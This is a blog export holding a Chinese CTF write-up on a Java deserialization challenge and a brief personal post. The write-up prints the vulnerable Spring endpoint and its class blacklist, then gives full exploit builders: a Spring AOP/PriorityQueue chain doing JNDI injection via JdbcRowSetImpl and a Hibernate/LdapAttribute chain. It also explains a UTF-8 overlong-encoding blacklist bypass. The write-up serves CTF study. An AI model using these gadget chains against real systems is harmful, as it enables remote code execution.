<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ccsssc复赛</title>
      <link href="/2025/04/21/ccsssc-fu-sai/index/"/>
      <url>/2025/04/21/ccsssc-fu-sai/index/</url>
      
        <content type="html"><![CDATA[<p>一场很幽默的比赛.但是其中的java题不错,还是值得复现一下的.<br>版本为java11.<br><img src="/images/Pasted%20image%2020250404151146.png"><br><code>backdoor.java</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">package com.example.ezjav.controller;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import com.example.ezjav.utils.MyObjectInputStream;</span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestBody;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line">@RestController</span><br><span class="line">public class backdoor &#123;</span><br><span class="line">    static String banner = &quot;Welcome to java&quot;;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&#123;&quot;/&quot;&#125;)</span><br><span class="line">    public String index() throws Exception &#123;</span><br><span class="line">        return banner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&#123;&quot;/read&quot;&#125;)</span><br><span class="line">    public String read(@RequestBody String body) &#123;</span><br><span class="line">        if (body != null)</span><br><span class="line">            try &#123;</span><br><span class="line">                byte[] data = Base64.getDecoder().decode(body);</span><br><span class="line">                String temp = new String(data);</span><br><span class="line">                if (temp.contains(&quot;naming&quot;) || temp.contains(&quot;com.sun&quot;) || temp.contains(&quot;jdk.jfr&quot;))</span><br><span class="line">                    return &quot;banned&quot;;</span><br><span class="line">                ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(data);</span><br><span class="line">                MyObjectInputStream objectInputStream = new MyObjectInputStream(byteArrayInputStream);</span><br><span class="line">                Object object = objectInputStream.readObject();</span><br><span class="line">                return object.getClass().toString();</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                return e.toString();</span><br><span class="line">            &#125;</span><br><span class="line">        return &quot;ok&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PalDataSource.java</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">package com.example.ezjav.utils;</span><br><span class="line"></span><br><span class="line">import com.alibaba.druid.pool.DruidDataSource;</span><br><span class="line">import java.sql.Connection;</span><br><span class="line">import java.sql.SQLException;</span><br><span class="line">import java.sql.SQLFeatureNotSupportedException;</span><br><span class="line">import java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line">public class PalDataSource extends DruidDataSource &#123;</span><br><span class="line">    public Connection getConnection(String username, String password) throws SQLException &#123;</span><br><span class="line">        return super.getConnection(username, password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Logger getParentLogger() throws SQLFeatureNotSupportedException &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>User.java</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">package com.example.ezjav.utils;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Comparator;</span><br><span class="line"></span><br><span class="line">public class User implements Serializable, Comparator &#123;</span><br><span class="line">    public String username;</span><br><span class="line"></span><br><span class="line">    public String password;</span><br><span class="line"></span><br><span class="line">    public Object compare;</span><br><span class="line"></span><br><span class="line">    public User(String user, String pass, String cmp) &#123;</span><br><span class="line">        this.username = user;</span><br><span class="line">        this.password = pass;</span><br><span class="line">        this.compare = cmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int compare(Object o1, Object o2) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Method m = this.compare.getClass().getDeclaredMethod(&quot;compare&quot;, new Class[] &#123; Object.class, Object.class &#125;);</span><br><span class="line">            m.setAccessible(true);</span><br><span class="line">            m.invoke(this.compare, new Object[] &#123; o1, o2 &#125;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MyObjectInputStream</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">package com.example.ezjav.utils;</span><br><span class="line"></span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.io.InvalidClassException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectStreamClass;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line"></span><br><span class="line">public class MyObjectInputStream extends ObjectInputStream &#123;</span><br><span class="line">    private String[] denyClasses;</span><br><span class="line"></span><br><span class="line">    public MyObjectInputStream(ByteArrayInputStream var1) throws IOException &#123;</span><br><span class="line">        super(var1);</span><br><span class="line">        ArrayList&lt;String&gt; classList = new ArrayList&lt;&gt;();</span><br><span class="line">        InputStream file = com.example.ezjav.utils.MyObjectInputStream.class.getResourceAsStream(&quot;blacklist.txt&quot;);</span><br><span class="line">        BufferedReader var2 = new BufferedReader(new InputStreamReader(file));</span><br><span class="line">        String var4;</span><br><span class="line">        while ((var4 = var2.readLine()) != null)</span><br><span class="line">            classList.add(var4.trim());</span><br><span class="line">        this.denyClasses = new String[classList.size()];</span><br><span class="line">        classList.toArray(this.denyClasses);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        String className = desc.getName();</span><br><span class="line">        int var5 = this.denyClasses.length;</span><br><span class="line">        for (int var6 = 0; var6 &lt; var5; var6++) &#123;</span><br><span class="line">            String denyClass = this.denyClasses[var6];</span><br><span class="line">            if (className.startsWith(denyClass))</span><br><span class="line">                throw new InvalidClassException(&quot;Unauthorized deserialization attempt&quot;, className);</span><br><span class="line">        &#125;</span><br><span class="line">        return super.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后来看一下黑名单<code>blacklist.txt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">javax.management.BadAttributeValueExpException</span><br><span class="line">com.sun.org.apache.xpath.internal.objects.XString</span><br><span class="line">java.rmi.MarshalledObject</span><br><span class="line">java.rmi.activation.ActivationID</span><br><span class="line">javax.swing.event.EventListenerList</span><br><span class="line">java.rmi.server.RemoteObject</span><br><span class="line">javax.swing.AbstractAction</span><br><span class="line">javax.swing.text.DefaultFormatter</span><br><span class="line">java.beans.EventHandler</span><br><span class="line">java.net.Inet4Address</span><br><span class="line">java.net.Inet6Address</span><br><span class="line">java.net.InetAddress</span><br><span class="line">java.net.InetSocketAddress</span><br><span class="line">java.net.Socket</span><br><span class="line">java.net.URL</span><br><span class="line">java.net.URLStreamHandler</span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br><span class="line">java.rmi.registry.Registry</span><br><span class="line">java.rmi.RemoteObjectInvocationHandler</span><br><span class="line">java.rmi.server.ObjID</span><br><span class="line">java.lang.System</span><br><span class="line">javax.management.remote.JMXServiceUR</span><br><span class="line">javax.management.remote.rmi.RMIConnector</span><br><span class="line">java.rmi.server.RemoteObject</span><br><span class="line">java.rmi.server.RemoteRef</span><br><span class="line">javax.swing.UIDefaults$TextAndMnemonicHashMap</span><br><span class="line">java.rmi.server.UnicastRemoteObject</span><br><span class="line">java.util.Base64</span><br><span class="line">java.util.Comparator</span><br><span class="line">java.util.HashMap</span><br><span class="line">java.util.logging.FileHandler</span><br><span class="line">java.security.SignedObject</span><br><span class="line">javax.swing.UIDefaults</span><br></pre></td></tr></table></figure><p>那么在看到这几个类,不考虑黑名单和依赖的情况下,首先关注到的就是在<code>User</code>类下的<code>Compare</code>方法.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public int compare(Object o1, Object o2) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Method m = this.compare.getClass().getDeclaredMethod(&quot;compare&quot;, new Class[] &#123; Object.class, Object.class &#125;);</span><br><span class="line">            m.setAccessible(true);</span><br><span class="line">            m.invoke(this.compare, new Object[] &#123; o1, o2 &#125;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然而仔细看了一下发现了问题,User类中的compare方法要求是String类型,并不是真正的可控.<br>然而这里给了我们启示,看到依赖中存在<code>spring-aop</code>和<code>aspectjweaver</code>,想到了新出的链子.对于直接解码进行的检测,可以直接使用<code>UTF8OverlongEncoding</code>去进行绕过.<br>对于除了<code>equals,hashcode</code>这两种方法,其他的都能触发<code>getAProxy</code>,打完整个利用链.<br>然而我们在尝试利用链的时候出现了报错:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.IllegalArgumentException: Can not set final java.util.Comparator field java.util.PriorityQueue.comparator to com.sun.proxy.$Proxy1</span><br><span class="line">at java.base/jdk.internal.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:167)</span><br><span class="line">at java.base/jdk.internal.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:171)</span><br><span class="line">at java.base/jdk.internal.reflect.UnsafeQualifiedObjectFieldAccessorImpl.set(UnsafeQualifiedObjectFieldAccessorImpl.java:83)</span><br><span class="line">at java.base/java.lang.reflect.Field.set(Field.java:780)</span><br><span class="line">at ReflectUtil.setFieldValue(ReflectUtil.java:33)</span><br><span class="line">at ReflectUtil.setFieldValue(ReflectUtil.java:25)</span><br><span class="line">at Main.main(Main.java:26)</span><br></pre></td></tr></table></figure><p>意思是不能将proxy1赋值给一个<code>Comparator</code>对象,那么我们就需要去给他套一个<code>Comparator</code>接口.<br>TemplatesImpl被禁用了,这里我们选择<code>JdbcRowSetImpl</code>来打一个jndi注入.得到payload如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line">import org.aopalliance.aop.Advice;</span><br><span class="line">import org.springframework.aop.aspectj.AspectJAroundAdvice;</span><br><span class="line">import org.springframework.aop.aspectj.AspectJExpressionPointcut;</span><br><span class="line">import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.util.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();</span><br><span class="line">        jdbcRowSet.setDataSourceName(&quot;ldap://127.0.0.1:50389/8cb29d&quot;);</span><br><span class="line">        Method method=jdbcRowSet.getClass().getMethod(&quot;getDatabaseMetaData&quot;);</span><br><span class="line">        SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(jdbcRowSet);</span><br><span class="line">        AspectJAroundAdvice advice = new AspectJAroundAdvice(method,new AspectJExpressionPointcut(),factory);</span><br><span class="line">        Proxy proxy1 = (Proxy) ProxyUtil.getAProxy(advice,Advice.class);</span><br><span class="line">        Proxy finalproxy=(Proxy) ProxyUtil.getBProxy(proxy1,new Class[]&#123;Comparator.class&#125;);</span><br><span class="line">        PriorityQueue PQ=new PriorityQueue(1);</span><br><span class="line">        PQ.add(1);</span><br><span class="line">        PQ.add(2);</span><br><span class="line"></span><br><span class="line">        ReflectUtil.setFieldValue(PQ,&quot;comparator&quot;,finalproxy);</span><br><span class="line">        ReflectUtil.setFieldValue(PQ,&quot;queue&quot;,new Object[]&#123;proxy1,proxy1&#125;);</span><br><span class="line">        System.out.println(SerializeUtil.serializeBypass(PQ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么接下来就是注谁的问题,看了一下<code>Jackson</code>的版本,还是能打,可以考虑直接打Jackson链,本地成功的执行了命令.<br>看到了一位师傅的blog:<a href="https://gsbp0.github.io/post/%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E8%B5%9B%E7%8E%B0%E5%9C%BA%E8%B5%9B%E4%B8%8A%E5%AF%B9justdeserialize%E6%94%BB%E5%87%BB%E7%9A%84%E5%87%A0%E6%AC%A1%E5%B0%9D%E8%AF%95/">软件系统安全赛</a>,说是可以打一个druid+hsql二次反序列化.hsql有好多二次反序列化的打法,都是在jndi注入的时候打的,这里我没研究过,索性挨个试.<br>直接使用java-chains去生成payload<br><img src="/images/Pasted%20image%2020250402195012.png"><br>也是成功的执行命令了.</p><p>后记(来自上面师傅的博客):<br><img src="/images/Pasted%20image%2020250402195708.png"></p><p>补档:学了Hibernate反序列化之后,发现这题也可以直接用Hibernate反序列化去打一个LdapAttribute注入,下面是构造的exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">import org.hibernate.engine.spi.TypedValue;</span><br><span class="line">import org.hibernate.property.access.spi.Getter;</span><br><span class="line">import org.hibernate.property.access.spi.GetterMethodImpl;</span><br><span class="line">import org.hibernate.tuple.component.AbstractComponentTuplizer;</span><br><span class="line">import org.hibernate.tuple.component.PojoComponentTuplizer;</span><br><span class="line">import org.hibernate.type.ComponentType;</span><br><span class="line"></span><br><span class="line">import javax.naming.CompositeName;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Hibernate1 &#123;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * org.hibernate.property.access.spi.GetterMethodImpl.get()</span><br><span class="line">     * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue()</span><br><span class="line">     * org.hibernate.type.ComponentType.getPropertyValue(C)</span><br><span class="line">     * org.hibernate.type.ComponentType.getHashCode()</span><br><span class="line">     * org.hibernate.engine.spi.TypedValue$1.initialize()</span><br><span class="line">     * org.hibernate.engine.spi.TypedValue$1.initialize()</span><br><span class="line">     * org.hibernate.internal.util.ValueHolder.getValue()</span><br><span class="line">     * org.hibernate.engine.spi.TypedValue.hashCode()</span><br><span class="line">     */</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">        String ldapCtxUrl = &quot;ldap://127.0.0.1:50389/&quot;;</span><br><span class="line">        Class ldapAttributeClazz = Class.forName(&quot;com.sun.jndi.ldap.LdapAttribute&quot;);</span><br><span class="line">        Class basicAttributeClazz = Class.forName(&quot;javax.naming.directory.BasicAttribute&quot;);</span><br><span class="line">        Object ldapAttribute = ReflectUtil.newInstance(ldapAttributeClazz, basicAttributeClazz, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;name&quot;&#125;);</span><br><span class="line"></span><br><span class="line">        ReflectUtil.setFieldValue(ldapAttribute,&quot;baseCtxURL&quot;,ldapCtxUrl);</span><br><span class="line">        ReflectUtil.setFieldValue(ldapAttribute,&quot;rdn&quot;,new CompositeName(&quot;55f375/&quot;));</span><br><span class="line"></span><br><span class="line">        ComponentType componentType = (ComponentType) ReflectUtil.newInstance(ComponentType.class,null,null);</span><br><span class="line"></span><br><span class="line">        ReflectUtil.setFieldValue(componentType,&quot;propertySpan&quot;,2);</span><br><span class="line"></span><br><span class="line">        TypedValue typedValue = new TypedValue(componentType, ldapAttribute);</span><br><span class="line"></span><br><span class="line">        PojoComponentTuplizer pojoComponentTuplizer = (PojoComponentTuplizer) ReflectUtil.newInstance(PojoComponentTuplizer.class,null,null);</span><br><span class="line"></span><br><span class="line">        ReflectUtil.setFieldValue(AbstractComponentTuplizer.class,pojoComponentTuplizer,&quot;getters&quot;,new Getter[]&#123;new GetterMethodImpl(Object.class,&quot;qwq&quot;, ldapAttributeClazz.getDeclaredMethod(&quot;getAttributeDefinition&quot;))&#125;);</span><br><span class="line">        ReflectUtil.setFieldValue(componentType,&quot;componentTuplizer&quot;,pojoComponentTuplizer);</span><br><span class="line"></span><br><span class="line">        Hashtable hashTable = new Hashtable();</span><br><span class="line">        hashTable.put(1,1);</span><br><span class="line"></span><br><span class="line">        Field tableField = Hashtable.class.getDeclaredField(&quot;table&quot;);</span><br><span class="line">        tableField.setAccessible(true);</span><br><span class="line">        Object[] table = (Object[]) tableField.get(hashTable);</span><br><span class="line">        for (Object entry: table)&#123;</span><br><span class="line">            if (entry != null)&#123;</span><br><span class="line">                ReflectUtil.setFieldValue(entry,&quot;key&quot;,typedValue);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        byte[] bytes = SerializeUtil.serializeBypass(hashTable);</span><br><span class="line"></span><br><span class="line">//        SerializeUtil.deserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里反射构造对象的时候需要手动指定<code>LdapAttribute</code>的父类为<code>BasicAttribute</code>.<br>然而在实际打的时候发现了一个问题,<code>UTF8OverlongEncoding</code>bypass后还是带naming,这是由于进行Overlong Bypass使用的工具类只对<code>TC_CLASSDESC</code>进行了处理导致的.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">StreamHeader</span><br><span class="line">  -&gt; magic number (0xAC ED)</span><br><span class="line">  -&gt; version (0x00 05)</span><br><span class="line"></span><br><span class="line">Content (多个对象内容)</span><br><span class="line">  -&gt; TC_OBJECT</span><br><span class="line">    -&gt; classDesc</span><br><span class="line">      -&gt; TC_CLASSDESC</span><br><span class="line">        -&gt; className (UTF写入)</span><br><span class="line">        -&gt; serialVersionUID</span><br><span class="line">        -&gt; flags</span><br><span class="line">        -&gt; fieldDesc (字段信息)</span><br><span class="line">        -&gt; classAnnotations</span><br><span class="line">        -&gt; superClassDesc</span><br><span class="line">    -&gt; values</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以参考<a href="https://whoopsunix.com/docs/PPPYSO/advance/UTFMIX/">这篇文章</a>去手动处理,但是懒了,留到下次组会(?</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>为什么要换新博客</title>
      <link href="/2025/04/21/hello-world/"/>
      <url>/2025/04/21/hello-world/</url>
      
        <content type="html"><![CDATA[<p>自信安国赛败于天津后，决心开始一条全新的学习道路。<br>过往种种，皆为云烟；此后岁月，俱是纤尘。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
